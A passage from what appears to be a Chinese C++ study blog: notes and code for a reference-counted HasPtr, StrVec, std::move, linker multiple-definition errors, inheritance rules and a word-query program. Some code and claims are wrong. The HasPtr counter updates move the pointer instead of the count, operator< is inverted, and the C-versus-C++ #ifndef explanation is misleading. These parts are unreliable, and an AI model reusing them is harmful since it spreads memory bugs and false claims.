class="built_in">i</span>(hasptr.i),<span class="built_in">use</span>(hasptr.use)&#123;</span><br><span class="line">        *use++;</span><br><span class="line">    &#125;;</span><br><span class="line">    HasPtr&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> HasPtr &amp;hasptr)&#123;</span><br><span class="line">        (*hasptr.use)++;</span><br><span class="line">        *use--;</span><br><span class="line">        <span class="keyword">if</span>(*use==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">delete</span> use;</span><br><span class="line">            <span class="keyword">delete</span> ptr;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr=hasptr.ptr;</span><br><span class="line">        use=hasptr.use;</span><br><span class="line">        i=hasptr.i;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(HasPtr &amp;hp)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;hp.i)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">string&amp; <span class="title">getstring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> *(<span class="keyword">this</span>-&gt;ptr);</span><br><span class="line">    &#125;;</span><br><span class="line">    ~<span class="built_in">HasPtr</span>()&#123;</span><br><span class="line">        *use--;</span><br><span class="line">        <span class="keyword">if</span>(*use==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">delete</span> use;</span><br><span class="line">            <span class="keyword">delete</span> ptr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">size_t</span> *use;</span><br><span class="line">    string *ptr;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(HasPtr &amp;lhs,HasPtr &amp;rhs)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hp swap&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">swap</span>(lhs.use,rhs.use);</span><br><span class="line">    <span class="built_in">swap</span>(lhs.ptr,rhs.ptr);</span><br><span class="line">    <span class="built_in">swap</span>(lhs.i,rhs.i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="const对象只能调用const成员函数"><a href="#const对象只能调用const成员函数" class="headerlink" title="const对象只能调用const成员函数"></a>const对象只能调用const成员函数</h2><p>因为要保证对象的const属性.</p>
<h2 id="std-move"><a href="#std-move" class="headerlink" title="std::move"></a>std::move</h2><p>标准库函数，能够显示调用对象的移动构造函数。</p>
<p>比如下面的代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string s1=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">    <span class="function">string <span class="title">s2</span><span class="params">(move(s1))</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就是将s1移动到了s2,移动后s1依然可以正常析构，但是此时s1不再指向”123”的字符串了，s2将指向”123”的字符串。</p>
<h2 id="multiple-definition-多重定义问题"><a href="#multiple-definition-多重定义问题" class="headerlink" title="multiple definition 多重定义问题"></a>multiple definition 多重定义问题</h2><p>在c++中切记切记不要在头文件中定义全局变量或者函数，因为如果这个头文件被多个cpp文件引用绝对会爆multiple definition这个错。</p>
<p>如果在头文件中定义了变量（是定义不是声明），并分别在a.c和b.c中进行了引用，编译过程中这个变量的符号会同时包含在a.o和b.o中，导致链接失败，原因是C语言规定“一个变量可以多次声明但只能定义一次”，解决办法是在头文件中加上#ifndef X条件编译，使该变量只定义一次，但是这里又有一个问题，该解决办法只适用C而不适用C++，在C++中，即使在头文件中加了#ifndef X，链接错误同样会发生，原因是C++中#ifndef X的作用域<strong>仅在单个文件中</strong>，因此只要在.h中定义了变量并在不同.cpp中进行引用，链接时都会报重定义错误，再说得直白点，a.cpp和b.cpp都引用了条件编译的g.h，g.h的条件编译只能分别保证在a.cpp和b.cpp中不出现重复定义，但在链接a.o和b.o的过程中就会发现重复定义。</p>
<p>c++这样做我理解是更加细粒度变量的作用域，变量只属于某一个模块而不是整个程序，如果一个模块想使用另一个模块的某一个变量就得使用<code>extern</code>这个关键字</p>
<p>extern可以置于变量或者函数前，以标示变量或者函数的定义在别的文件中，提示编译器遇到此变量和函数时在其他模块中寻找其定义。要使用其他模块的变量只要在这个模块中使用<code>extern 变量声明</code>就可以了。</p>
<h2 id="StrVec简单实现"><a href="#StrVec简单实现" class="headerlink" title="StrVec简单实现"></a>StrVec简单实现</h2><p>.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INC_1_STRVEC_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INC_1_STRVEC_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;initializer_list&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StrVec</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">StrVec</span>():<span class="built_in">elements</span>(<span class="literal">nullptr</span>),<span class="built_in">first_free</span>(<span class="literal">nullptr</span>),<span class="built_in">cap</span>(<span class="literal">nullptr</span>)&#123;&#125;;</span><br><span class="line">    <span class="built_in">StrVec</span>(std::initializer_list&lt;std::string&gt;);</span><br><span class="line">    <span class="built_in">StrVec</span>(<span class="keyword">const</span> StrVec&amp;);</span><br><span class="line">    StrVec&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> StrVec&amp;);</span><br><span class="line">    std::string&amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> );</span><br><span class="line">    ~<span class="built_in">StrVec</span>();</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(<span class="keyword">const</span> std::string&amp;)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">size_t</span> <span class="title">size</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> first_free-elements;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">size_t</span> <span class="title">capacity</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cap-elements;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">std::string* <span class="title">begin</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> elements;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">std::string* <span class="title">end</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> first_free;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">size_t</span>,<span class="keyword">const</span> std::string&amp; s=std::string(<span class="string">&quot;&quot;</span>))</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reserve</span><span class="params">(<span class="keyword">size_t</span>)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">static</span> std::allocator&lt;std::string&gt; alloc;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">chk_n_alloc</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">size</span>()==<span class="built_in">capacity</span>())&#123;</span><br><span class="line">            <span class="built_in">reallocate</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">std::pair&lt;std::string*,std::string*&gt; <span class="title">alloc_n_copy</span><span class="params">(<span class="keyword">const</span> std::string*,<span class="keyword">const</span> std::string*)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reallocate</span><span class="params">()</span></span>;</span><br><span class="line">    std::string *elements;</span><br><span class="line">    std::string *first_free;</span><br><span class="line">    std::string *cap;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//INC_1_STRVEC_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;StrVec.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">std::allocator&lt;std::string&gt; StrVec::alloc;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrVec::push_back</span><span class="params">(<span class="keyword">const</span> std::string &amp;s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">chk_n_alloc</span>();</span><br><span class="line">    alloc.<span class="built_in">construct</span>(first_free++,s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::pair&lt;std::string *, std::string *&gt; <span class="title">StrVec::alloc_n_copy</span><span class="params">(<span class="keyword">const</span> std::string *b, <span class="keyword">const</span> std::string *e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> data=alloc.<span class="built_in">allocate</span>(e-b);</span><br><span class="line">    <span class="keyword">return</span> &#123;data, std::<span class="built_in">uninitialized_copy</span>(b,e,data)&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrVec::free</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(elements)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> p=first_free;p!=elements;)&#123;</span><br><span class="line">            alloc.<span class="built_in">destroy</span>(--p);</span><br><span class="line">        &#125;</span><br><span class="line">        alloc.<span class="built_in">deallocate</span>(elements,cap-elements);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">StrVec::<span class="built_in">StrVec</span>(<span class="keyword">const</span> StrVec &amp; strvec) &#123;</span><br><span class="line">    <span class="keyword">auto</span> newstrings= <span class="built_in">alloc_n_copy</span>(strvec.<span class="built_in">begin</span>(),strvec.<span class="built_in">end</span>());</span><br><span class="line">    elements=newstrings.first;</span><br><span class="line">    first_free=cap=newstrings.second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">StrVec &amp;StrVec::<span class="keyword">operator</span>=(<span class="keyword">const</span> StrVec &amp;strvec) &#123;</span><br><span class="line">    <span class="keyword">auto</span> newstrings= <span class="built_in">alloc_n_copy</span>(strvec.<span class="built_in">begin</span>(),strvec.<span class="built_in">end</span>());</span><br><span class="line">    <span class="built_in">free</span>();</span><br><span class="line">    elements=newstrings.first;</span><br><span class="line">    first_free=cap=newstrings.second;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrVec::reallocate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> newvecsize=<span class="built_in">size</span>()? <span class="built_in">size</span>()*<span class="number">2</span>:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">auto</span> newelement=alloc.<span class="built_in">allocate</span>(newvecsize);</span><br><span class="line">    <span class="keyword">auto</span> dest=newelement;</span><br><span class="line">    <span class="keyword">auto</span> src=elements;</span><br><span class="line">    <span class="keyword">while</span>(src!=first_free)&#123;</span><br><span class="line">        alloc.<span class="built_in">construct</span>(dest++,std::<span class="built_in">move</span>(*src++));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>();</span><br><span class="line">    elements=newelement;</span><br><span class="line">    first_free=dest;</span><br><span class="line">    cap=elements+newvecsize;</span><br><span class="line">&#125;</span><br><span class="line">StrVec::~<span class="built_in">StrVec</span>() &#123;</span><br><span class="line">    <span class="built_in">free</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrVec::resize</span><span class="params">(<span class="keyword">size_t</span> newsize, <span class="keyword">const</span> std::string &amp;s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> newelement=alloc.<span class="built_in">allocate</span>(newsize);</span><br><span class="line">    <span class="keyword">auto</span> dest=newelement;</span><br><span class="line">    <span class="keyword">auto</span> src=elements;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;(i&lt;newsize)&amp;&amp;(src!=first_free);i++)&#123;</span><br><span class="line">        alloc.<span class="built_in">construct</span>(dest++,std::<span class="built_in">move</span>(*src++));</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">free</span>();</span><br><span class="line">    elements=newelement;</span><br><span class="line">    first_free=dest;</span><br><span class="line">    cap=elements+newsize;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StrVec::reserve</span><span class="params">(<span class="keyword">size_t</span> newsize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(newsize&gt;<span class="built_in">capacity</span>())&#123;</span><br><span class="line">        <span class="built_in">resize</span>(newsize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">StrVec::<span class="built_in">StrVec</span>(std::initializer_list&lt;std::string&gt; lst) :<span class="built_in">elements</span>(<span class="literal">nullptr</span>),<span class="built_in">first_free</span>(<span class="literal">nullptr</span>),<span class="built_in">cap</span>(<span class="literal">nullptr</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> iter=lst.<span class="built_in">begin</span>();iter!=lst.<span class="built_in">end</span>();iter++)&#123;</span><br><span class="line">        <span class="built_in">push_back</span>(*iter);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">std::string &amp;StrVec::<span class="keyword">operator</span>[](<span class="keyword">int</span> idx) &#123;</span><br><span class="line">    <span class="keyword">return</span> *(elements+idx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="左值-右值-左值引用-右值引用"><a href="#左值-右值-左值引用-右值引用" class="headerlink" title="左值 右值 左值引用 右值引用"></a>左值 右值 左值引用 右值引用</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jacky_Feng/article/details/120742414">(93条消息) 【C++】左值和右值、左值引用（&amp;）和右值引用（&amp;&amp;）_Jacky_Feng的博客-CSDN博客_c++ 左值右值&amp;&amp;的作用</a></p>
<p>比较有意思的点是右值引用变量是左值。所以不能把一个右值引用变量赋值给一个右值引用变量。因为右值引用变量是一个变量，在内存中有对应地址，所以他本身并不是一个右值，而是一个左值。</p>
<h2 id="类的小知识点总结"><a href="#类的小知识点总结" class="headerlink" title="类的小知识点总结"></a>类的小知识点总结</h2><ul>
<li><p>动态绑定就相当于多态，多态不仅可以通过指针来使用，还可以通过引用</p>
</li>
<li><p>虚函数也可以在自己的类中进行定义</p>
</li>
<li><p>析构函数是可以虚函数的，在基类中通常就应该定义一个虚析构函数。</p>
</li>
<li><p>任何构造函数之外的非静态函数都可以是虚函数。</p>
</li>
<li><p>派生类必须将继承而来的成员函数中需要覆盖的那些重新声明。</p>
</li>
<li><p>派生类如果是public继承了类，那他就只可以访问父类的公有成员和受保护成员0，不可以访问私有成员。</p>
</li>
<li><p>如果派生类的虚函数需要使用默认实参，基类和派生类中定义的默认实参最好一致，不然通过多态调用派生类的虚函数的时候，传入的默认参数是基类的默认参数。</p>
</li>
<li><p>派生类可以重写或者不重写基类的虚函数，但是纯虚函数派生类必须得重写，除非派生类也是一个抽象基类。</p>
</li>
<li><p>protected是publibc和private的中和产物，当使用protected修饰成员的时候，这个成员就是受保护成员，这个成员对于类的用户来说不可见，但是对类的派生类可见。        </p>
</li>
<li><p>对于访问权限和继承来说，有两个影响变量，可以通过三个角度来讨论，即类的使用者，类是实现者，类的派生类。解释起来有些麻烦，忘了还是直接看书吧，p542处.</p>
</li>
<li><p>派生类的作用域位于基类作用域之内，在如果调用类的某个成员函数时首先进行名字匹配，从这个类找起，如果这个类没有那就从这个类的父类找起，如果没有找见那就一直找到这个继承链的顶点，如果还没有找到那就报错，如果名字匹配上了，那就再进行类型检查，检查通过了就是合法调用。</p>
</li>
<li><p>比较有意思的是派生类不存在对基类的重载，如果派生类的变量或者函数的名字和基类重了那派生类就会隐藏基类的重名函数或者重名变量，那其实重名变量在内存中有两份了，必须得通过作用域运算符来强制访问，下面的代码就是很好的解释,值得注意的是名字查找优于类型查找，如果派生类中的成员函数只有名字和基类函数重名，类型完全不一样，派生类还是会隐藏基类的函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span>  c;</span><br><span class="line">    A()&#123;</span><br><span class="line">        c=<span class="number">14</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;:&quot;</span>&lt;&lt;c&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span> <span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    B(<span class="keyword">int</span> c):c(c)&#123;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">get_c</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;A::c&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">B <span class="title">b</span><span class="params">(<span class="number">23</span>)</span></span>;</span><br><span class="line">    b.c=<span class="number">12</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;b.c&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    b.get_c();</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;b.c&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>如果基类中有一个函数名的多个重载版本，在派生类中还想重载某一个版本，不能直接对其重载，原因上述已经说清楚了，可以使用using把所有的重载版本全部引入派生类中再进行重载。</p>
</li>
<li><p>一条经验准则，如果一个类需要析构函数，那么它也同样需要拷贝和赋值操作。但是基类的虚析构函数是个例外。原因仔细想想也能明白，正常一个类需要析构函数是因为有自己管理的资源了，有自己管理的资源那就得考虑拷贝和赋值移动的时候到底该怎么处理，但是基类不一样，基类有析构函数是因为要为多态服务，他自己可能有资源可能没有，所以可以不必要有拷贝赋值移动操纵。</p>
</li>
<li><p>虚函数和多态是强绑定的，虚函数并不是说基类有虚函数，派生类就必须实现虚函数，这是错误的观点，虚函数我感觉就是完全为了多态服务，当基类的指针或者引用指向了派生类时，如果调用了虚函数，就会调用指向的对象的函数。所以如果派生类都有某个功能但是实现的方式不一样的话就可以标记成虚函数，除此之外就没必要了。 </p>
</li>
<li><p>当一个类中有了析构函数就不会合成移动操作，基类一定有析构函数，所以正常情况下一定没有合成的移动操作，这就会阻止派生类拥有自己的移动操作，所以如果派生类确实需要自己的移动操作，就需要在基类中显示的定义移动操作。</p>
</li>
<li><p>不管是移动，构造，还是拷贝，派生类都会在初始化列表中调用基类的对应函数，以此来移动，构造或者拷贝派生类中的基类部分，然后在函数体中移动，构造，或者拷贝派生类自己的部分。</p>
</li>
<li><p>在析构函数执行完之后，对象的成员会被隐式销毁，类似的，对象的基类部分也是隐式销毁，所以没必要在派生类的析构函数中调用基类的析构函数。</p>
</li>
<li><p>最后不要在基类的特殊函数中使用虚函数，因为如果是派生调用基类的特殊函数的时候基类的特殊函数里的虚函数就会执行派生类的虚函数版本，这会导致不可知的错误。如果需要使用的话最好指明虚函数版本。</p>
</li>
</ul>
<h2 id="第十五章-单词查询程序"><a href="#第十五章-单词查询程序" class="headerlink" title="第十五章 单词查询程序"></a>第十五章 单词查询程序</h2><p>通过这个练习让我更加深刻的理解了类的继承的实际意义，对于要处理某一类事情，这类事情又可以分成很多小类型的话，那就可以提取所有小类型的公共特性然后成为一个基类，这些小类型继承这些基类，如果这些小类型还可以再细分的话，再次对小类型的所有小类型提取共有特性成为一个基类，小类型的小类型继承这个基类，依次类推。</p>
<p>这么做我感觉最大的好处就是让整个继承体系条理分明，层次关系清晰，还减少了代码的冗余量。</p>
<p>要处理某一类事情不能直接使用我们构造的继承体系，因为最后派生类你改使用哪一个派生类呢，所以得再构造一个类来管理使用这个继承体系，这个类（即Query）就是这个继承体系的接口类，暴露了这个继承体系的接口又隐藏了整个继承体系。</p>
<p>下面是这个联系的代码</p>
<p>Query.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INC_1_QUERY_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INC_1_QUERY_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;TextQuery.h&quot;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query_base</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span> &#123;</span></span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span>~(<span class="keyword">const</span> Query &amp;);</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span>&amp;(<span class="keyword">const</span> Query &amp;,<span class="keyword">const</span> Query &amp;);</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span>|(<span class="keyword">const</span> Query &amp;,<span class="keyword">const</span> Query &amp;);</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Query</span>(<span class="keyword">const</span> std::string &amp;s);</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(TextQuery &amp;t)</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function">std::string <span class="title">rep</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">Query</span>(std::shared_ptr&lt;Query_base&gt; query) :<span class="built_in">q</span>(query)&#123;&#125;;</span><br><span class="line">    std::shared_ptr&lt;Query_base&gt; q;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//INC_1_QUERY_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Query.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Query.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Query_base.h&quot;</span></span></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream &amp;os,<span class="keyword">const</span> Query &amp;query)&#123;</span><br><span class="line">    <span class="keyword">return</span> os&lt;&lt;query.<span class="built_in">rep</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">QueryResult <span class="title">Query::eval</span><span class="params">(TextQuery &amp;t)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> q-&gt;<span class="built_in">eval</span>(t);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">std::string <span class="title">Query::rep</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> q-&gt;<span class="built_in">rep</span>();</span><br><span class="line">&#125;</span><br><span class="line">Query::<span class="built_in">Query</span>(<span class="keyword">const</span> std::string &amp;s):<span class="built_in">q</span>(<span class="keyword">new</span> <span class="built_in">WordQuery</span>(s))&#123;&#125;</span><br><span class="line"></span><br><span class="line">Query <span class="keyword">operator</span>~(<span class="keyword">const</span> Query &amp;q) &#123;</span><br><span class="line"><span class="comment">//    this-&gt;q=std::shared_ptr&lt;Query_base&gt;(new NotQuery(*this));</span></span><br><span class="line"><span class="comment">//    return *this;</span></span><br><span class="line">    <span class="keyword">return</span> std::shared_ptr&lt;Query_base&gt;(<span class="keyword">new</span> 